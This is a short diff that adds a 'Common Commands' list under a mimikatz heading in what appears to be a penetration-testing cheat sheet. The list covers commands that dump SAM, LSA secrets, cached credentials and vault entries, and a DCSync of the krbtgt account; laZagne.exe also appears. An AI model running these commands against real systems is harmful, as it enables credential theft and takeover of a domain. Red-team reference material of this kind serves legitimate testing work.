@@ -2483,6 +2483,19 @@ laZagne.exe all
 
 #### mimikatz
 
+##### Common Commands
+
+```c
+token::elevate
+token::revert
+vault::cred
+vault::list
+lsadump::sam
+lsadump::secrets
+lsadump::cache
+lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
+```
+
 ##### Dump Hshes
 
 ```c
